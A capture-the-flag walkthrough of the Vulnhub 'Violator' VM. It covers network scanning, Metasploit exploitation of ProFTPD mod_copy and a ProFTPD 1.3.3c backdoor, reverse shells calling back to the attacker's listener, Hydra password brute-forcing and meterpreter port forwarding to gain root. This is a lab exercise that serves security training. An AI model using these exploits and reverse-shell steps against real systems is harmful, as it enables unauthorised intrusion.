## Violator: 1

### info

```
Welcome to another boot2root / CTF this one is called Violator. The VM is set to grab a DHCP lease on boot. As with my previous VMs, there is a theme, and you will need to snag the flag in order to complete the challenge.

A word of warning: The VM has a small HDD so you can brute force, but please set the disk to non persistent so you can always revert.

Some hints for you:

    Vince Clarke can help you with the Fast Fashion.
    The challenge isn't over with root. The flag is something special.
    I have put a few trolls in, but only to sport with you.

SHA1SUM: 47F68241E95E189126E94A38CB4AD461DD58EE88 violator.ova

Many thanks to BenR and GKNSB for testing this CTF.

Special thanks and shout-outs go to BenR, Rasta_Mouse and g0tmi1k for helping me to learn a lot creating these challenges.

https://www.vulnhub.com/entry/violator-1,153/
```

### discovery

```bash
root@kali:~# netdiscover -r 192.168.93.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.93.1    00:50:56:c0:00:08      1      60  VMware, Inc.
 192.168.93.2    00:50:56:fe:26:a7      1      60  VMware, Inc.
 192.168.93.138  00:0c:29:45:01:53      1      60  VMware, Inc.
 192.168.93.254  00:50:56:fd:87:3c      1      60  VMware, Inc.
```

### port scan

```bash
root@kali:~/Violator# nmap -p- -sC  192.168.93.138 -sV

Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-18 01:18 BST
Nmap scan report for 192.168.93.138
Host is up (0.00056s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5rc3
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: I Say... I say... I say Boy! You pumpin' for oil or somethin'...?
MAC Address: 00:0C:29:45:01:53 (VMware)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds
```

### port 80

```
root@kali:~/Violator# curl http://192.168.93.138/
<html>
<title>I Say... I say... I say Boy! You pumpin' for oil or somethin'...?</title>
  <body>
    <br>I Say.. I say... I say boy!  You're barkin up the wrong tree!</br>
    <img src="foggie.jpg" alt="foggie.jpg" height=1041" width="731">
   <-- https://en.wikipedia.org/wiki/Violator_(album)  -->
  </body>
</html>
```

hmmm not a lot

```bash
root@kali:~/Violator# dirb http://192.168.93.138/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Jul 18 01:05:35 2016
URL_BASE: http://192.168.93.138/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.93.138/ ----
+ http://192.168.93.138/index.html (CODE:200|SIZE:318)
+ http://192.168.93.138/server-status (CODE:403|SIZE:294)

-----------------
END_TIME: Mon Jul 18 01:05:39 2016
DOWNLOADED: 4612 - FOUND: 2
root@kali:~/Violator# nikto -host http://192.168.93.138/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.93.138
+ Target Hostname:    192.168.93.138
+ Target Port:        80
+ Start Time:         2016-07-18 01:05:47 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x13e 0x53518115c6709
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2016-07-18 01:06:01 (GMT1) (14 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### port 21

```bash
root@kali:~/Violator# searchsploit ProFTPD 1.3.5
-------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                    |  Path
                                                                                                  | (/usr/share/exploitdb/platforms)
-------------------------------------------------------------------------------------------------- ----------------------------------
ProFTPd 1.3.5 - File Copy                                                                         | ./linux/remote/36742.txt
ProFTPd 1.3.5 (mod_copy) - Remote Command Execution                                               | ./linux/remote/36803.py
ProFTPD 1.3.5 - Mod_Copy Command Execution                                                        | ./linux/remote/37262.rb
-------------------------------------------------------------------------------------------------- ----------------------------------
```
### shell

```ruby
msf exploit(proftpd_modcopy_exec) > show options

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      192.168.93.138   yes       The target address
   RPORT      80               yes       HTTP port
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www/html    yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.93.128   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5

```

```ruby
msf exploit(proftpd_modcopy_exec) > exploit

[*] Started reverse TCP handler on 192.168.93.128:4444
[*] 192.168.93.138:80 - 192.168.93.138:21 - Connected to FTP server
[*] 192.168.93.138:80 - 192.168.93.138:21 - Sending copy commands to FTP server
[*] 192.168.93.138:80 - Executing PHP payload /LuwET.php
[*] Command shell session 2 opened (192.168.93.128:4444 -> 192.168.93.138:51164) at 2016-07-18 01:29:48 +0100

python -c 'import pty;pty.spawn("/bin/bash")'
www-data@violator:/var/www/html$
```


```bash
www-data@violator:/var/www/html$ uname -a
uname -a
Linux violator 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
www-data@violator:/var/www/html$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.3 LTS
Release:	14.04
Codename:	trusty
```

```bash
www-data@violator:/tmp$ wget http://192.168.93.128:8080/LinEnum.sh
wget http://192.168.93.128:8080/LinEnum.sh
The program 'wget' is currently not installed. To run 'wget' please ask your administrator to install the package 'wget'
```

```bash
www-data@violator:/tmp$ scp root@192.168.93.128:/root/Violator/LinEnum.sh .
scp root@192.168.93.128:/root/Violator/LinEnum.sh .
Could not create directory '/var/www/.ssh'.
The authenticity of host '192.168.93.128 (192.168.93.128)' can't be established.
ECDSA key fingerprint is 8b:38:82:e5:3b:5e:49:11:33:a3:39:be:e9:dd:a7:60.
Are you sure you want to continue connecting (yes/no)? yes
yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
root@192.168.93.128's password:

LinEnum.sh                                    100%   39KB  39.2KB/s   00:00
```

running that script shows interesting results

```bash
Users that have previously logged onto the system:
Username         Port     From             Latest
dg               tty1                      Tue Jun 14 19:43:25 +0100 2016

```

`uid=1000(dg) gid=1000(dg) groups=1000(dg),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)`

```bash
dg:x:1000:1000:Dave Gahan,,,:/home/dg:/bin/bash
mg:x:1001:1001:Martin Gore:/home/mg:/bin/bash
af:x:1002:1002:Andrew Fletcher:/home/af:/bin/bash
```

```bash
www-data@violator:/home/dg/bd$ ls -al
ls -al
total 40
drwxr-xr-x 10 root root 4096 Jun  6 21:31 .
drwxr-xr-x  4 dg   dg   4096 Jun 14 19:55 ..
drwxr-xr-x  2 root root 4096 Jun  6 21:31 bin
drwxr-xr-x  2 root root 4096 Jun  6 21:46 etc
drwxr-xr-x  3 root root 4096 Jun  6 21:31 include
drwxr-xr-x  4 root root 4096 Jun  6 21:31 lib
drwxr-xr-x  2 root root 4096 Jun  6 21:31 libexec
drwxr-xr-x  2 root root 4096 Jun  6 21:31 sbin
drwxr-xr-x  4 root root 4096 Jun  6 21:31 share
drwxr-xr-x  2 root root 4096 Jun  6 23:17 var
```

```bash
www-data@violator:/home/mg$ ls -al
ls -al
total 28
drwxr-xr-x 2 mg   mg   4096 Jun 12 10:28 .
drwxr-xr-x 6 root root 4096 Jun  6 22:07 ..
-rw-r--r-- 1 mg   mg    220 Apr  9  2014 .bash_logout
-rw-r--r-- 1 mg   mg   3637 Apr  9  2014 .bashrc
-rw-r--r-- 1 mg   mg    675 Apr  9  2014 .profile
-rw------- 1 mg   mg    660 Jun 12 10:09 .viminfo
-rw-rw-r-- 1 mg   mg    112 Jun 12 10:28 faith_and_devotion
www-data@violator:/home/mg$ cat faith_and_devotion
cat faith_and_devotion
Lyrics:

* Use Wermacht with 3 rotors
* Reflector to B
Initial: A B C
Alphabet Ring: C B A
Plug Board A-B, C-D

```

```bash
www-data@violator:/home/aw$ ls -al
ls -al
total 28
drwxr-xr-x 2 aw   aw   4096 Jun 12 10:25 .
drwxr-xr-x 6 root root 4096 Jun  6 22:07 ..
-rw-r--r-- 1 aw   aw    220 Apr  9  2014 .bash_logout
-rw-r--r-- 1 aw   aw   3637 Apr  9  2014 .bashrc
-rw-r--r-- 1 aw   aw    675 Apr  9  2014 .profile
-rw------- 1 aw   aw    722 Jun 12 10:19 .viminfo
-rw-rw-r-- 1 aw   aw     59 Jun 12 10:19 hint
www-data@violator:/home/aw$ cat hint
cat hint
You are getting close... Can you crack the final enigma..?
www-data@violator:/home/aw$
```

i need to run `cewl -w ./Violator.txt -m 5 "https://en.wikipedia.org/wiki/Violator_(album)"`

but i get errors

```
/usr/lib/ruby/vendor_ruby/nokogiri/html/document.rb:205:in `read_memory': failed to allocate memory (NoMemoryError)
	from /usr/lib/ruby/vendor_ruby/nokogiri/html/document.rb:205:in `parse'
	from /usr/lib/ruby/vendor_ruby/nokogiri/html.rb:15:in `HTML'
	from /usr/bin/cewl:300:in `generate_next_urls'
	from /usr/bin/cewl:182:in `block (3 levels) in start!'
	from /usr/bin/cewl:256:in `get_page'
	from /usr/bin/cewl:178:in `block (2 levels) in start!'
	from /usr/bin/cewl:176:in `each'
	from /usr/bin/cewl:176:in `block in start!'
	from /usr/bin/cewl:167:in `each'
	from /usr/bin/cewl:167:in `start!'
	from /usr/bin/cewl:138:in `start_at'
	from /usr/bin/cewl:694:in `<main>'
```

i was having no luck with `cewl` and increasing the amount of RAM my vm has, so i copy and pasted the url given into a txt file and than ran the following

```bash
cat wordtest.txt | tr -d ')' | tr -d '(' | tr -d '^' | tr -d '[' | tr -d ']' | tr -d '"' | tr -d '-' | tr -d '–' | tr -d '.' | tr -d ',' | tr -d ':' | tr -d "'" | tr -d '/' | tr -s ' ', '\n' >> lined.txt
```

i now have a wordlist but the first letter of every word is upper case

simple fix

```python
#!/usr/bin/env python

import os

with open('/root/Violator/lined.txt', 'r') as item:
    for line in item:
        lo = line.lower()
        with open('/root/Violator/wordlist', 'a') as word:
            word.write(lo)
```

hmm this will take forever and i've already waisted so much time on this

```bash
root@kali:~/Violator# wc -l ./wordlist
2207 ./wordlist
```

better

```bash
root@kali:~/Violator# sort -u ./wordlist | wc -l
974
root@kali:~/Violator# sort -u ./wordlist >> usethiswordlist.txt
```

back to square one

```bash
root@kali:~/Violator# hydra -l dg -P usethiswordlist.txt  ftp://192.168.93.138
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-07-22 10:45:33
[DATA] max 16 tasks per 1 server, overall 64 tasks, 974 login tries (l:1/p:974), ~0 tries per task
[DATA] attacking service ftp on port 21

[STATUS] 352.00 tries/min, 352 tries in 00:01h, 622 to do in 00:02h, 16 active
[STATUS] 350.00 tries/min, 700 tries in 00:02h, 274 to do in 00:01h, 16 active
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2016-07-22 10:48:23
```

maybe i was too tight with my replacing

```bash
root@kali:~/Violator# cat wordtest.txt | tr -d ' ' | tr -d '"' >> 2ndtimesacharm.txt
```

now i need to make them all lower like last time

```python
#!/usr/bin/env python

import os

with open('/root/Violator/2ndtimesacharm.txt', 'r') as item:
    for line in item:
        lo = line.lower()
        with open('/root/Violator/2ndtimesacharm_lower.txt', 'a') as word:
            word.write(lo)
```

bingo !

```bash
root@kali:~/Violator# hydra -l dg -P 2ndtimesacharm_lower.txt ftp://192.168.93.138
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-07-22 11:13:40
[DATA] max 16 tasks per 1 server, overall 64 tasks, 200 login tries (l:1/p:200), ~0 tries per task
[DATA] attacking service ftp on port 21
[21][ftp] host: 192.168.93.138   login: dg   password: policyoftruth
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2016-07-22 11:13:48
```

there we go

```bash
www-data@violator:/home$ su dg
su dg
Password: policyoftruth

dg@violator:/home$ id
id
uid=1000(dg) gid=1000(dg) groups=1000(dg),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
```

### escalation

```bash
dg@violator:/home$ sudo -l
sudo -l
Matching Defaults entries for dg on violator:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dg may run the following commands on violator:
    (ALL) NOPASSWD: /home/dg/bd/sbin/proftpd

```

```bash
dg@violator:~/bd/sbin$ sudo ./proftpd
sudo ./proftpd
 - setting default address to 127.0.0.1
localhost - SocketBindTight in effect, ignoring DefaultServer
dg@violator:~/bd/sbin$ netstat -anto
netstat -anto
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:2121          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 192.168.93.138:51169    192.168.93.128:4444     CLOSE_WAIT  off (0.00/0/0)
tcp        0      0 192.168.93.138:51168    192.168.93.128:4444     CLOSE_WAIT  off (0.00/0/0)
tcp        0      0 192.168.93.138:51170    192.168.93.128:4444     ESTABLISHED off (0.00/0/0)
tcp        0      0 192.168.93.138:51164    192.168.93.128:4444     CLOSE_WAIT  off (0.00/0/0)
tcp6       0      0 :::21                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
dg@violator:~/bd/sbin$
```

```bash
root@kali:~/Violator# searchsploit ProFTPD 1.3.3c
-------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                    |  Path
                                                                                                  | (/usr/share/exploitdb/platforms)
-------------------------------------------------------------------------------------------------- ----------------------------------
ProFTPD 1.3.3c - Compromised Source Remote Root Trojan                                            | ./linux/remote/15662.txt
ProFTPD-1.3.3c - Backdoor Command Execution                                                       | ./linux/remote/16921.rb
-------------------------------------------------------------------------------------------------- ----------------------------------
```

if only it was this simple

```bash
dg@violator:~/bd/etc$ echo "DefaultAddress 0.0.0.0" >> proftpd.conf
echo "DefaultAddress 0.0.0.0" >> proftpd.conf
bash: proftpd.conf: Permission denied
```

lets upgrade to a meterpreter shell

```ruby
msf exploit(proftpd_modcopy_exec) > set autorunscript 'post/multi/manage/shell_to_meterpreter'
autorunscript => post/multi/manage/shell_to_meterpreter
msf exploit(proftpd_modcopy_exec) > exploit

[*] Started reverse TCP handler on 192.168.93.128:4444
[*] 192.168.93.138:80 - 192.168.93.138:21 - Connected to FTP server
[*] 192.168.93.138:80 - 192.168.93.138:21 - Sending copy commands to FTP server
[*] 192.168.93.138:80 - Executing PHP payload /5tNQTqR.php
[*] Command shell session 2 opened (192.168.93.128:4444 -> 192.168.93.138:51172) at 2016-07-22 11:41:22 +0100
[*] Session ID 2 (192.168.93.128:4444 -> 192.168.93.138:51172) processing AutoRunScript 'post/multi/manage/shell_to_meterpreter'
[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.93.128:4433
[*] Starting the payload handler...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 192.168.93.138
[*] Command stager progress: 100.00% (668/668 bytes)

881727860
iRnpgOPuCIcylCiYXQswavUPYFCVRRzq
Linux x86_64
NyMHqeRhWZuXZwGiHucOIsvWrAjCEGrQ
IUcewXRbAtQwdiUsQcIcmgbNRIdSKVzg
[*] Meterpreter session 3 opened (192.168.93.128:4433 -> 192.168.93.138:50643) at 2016-07-22 11:41:32 +0100


id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
^C
Abort session 2? [y/N]  y

[*] 192.168.93.138 - Command shell session 2 closed.  Reason: User exit

msf exploit(proftpd_modcopy_exec) > sessions

Active sessions
===============

  Id  Type                   Information                                                    Connection
  --  ----                   -----------                                                    ----------
  3   meterpreter x86/linux  uid=33, gid=33, euid=33, egid=33, suid=33, sgid=33 @ violator  192.168.93.128:4433 -> 192.168.93.138:50643 (192.168.93.138)

msf exploit(proftpd_modcopy_exec) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > sysinfo
Computer     : violator
OS           : Linux violator 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 (x86_64)
Architecture : x86_64
Meterpreter  : x86/linux
meterpreter >
```

now that we have a meterpreter shell we can port forward the local ftpserver to this session

```ruby
meterpreter > portfwd add -L 127.0.0.1 -l 2121  -p 2121 -r 127.0.0.1
[*] Local TCP relay created: 127.0.0.1:2121 <-> 127.0.0.1:2121

meterpreter > portfwd list

Active Port Forwards
====================

   Index  Local           Remote          Direction
   -----  -----           ------          ---------
   1      127.0.0.1:2121  127.0.0.1:2121  Forward

1 total active port forwards.
```

after relaunching the local proftpd service and using the exploit we are root

```ruby
msf exploit(proftpd_133c_backdoor) > show options

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  127.0.0.1        yes       The target address
   RPORT  2121             yes       The target port


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.93.128   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(proftpd_133c_backdoor) > exploit

[*] Started reverse TCP double handler on 192.168.93.128:4444
[*] 127.0.0.1:2121 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo cUiRGWPAAP6vXPJU;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "cUiRGWPAAP6vXPJU\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 5 opened (192.168.93.128:4444 -> 192.168.93.138:51183) at 2016-07-22 11:56:15 +0100

python -c 'import pty;pty.spawn("/bin/bash")'
root@violator:/# id
id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```

### flag

```bash
root@violator:/root# cat ./flag.txt
cat ./flag.txt
I say... I say... I say boy! Pumping for oil or something...?
---Foghorn Leghorn "A Broken Leghorn" 1950 (C) W.B.
```
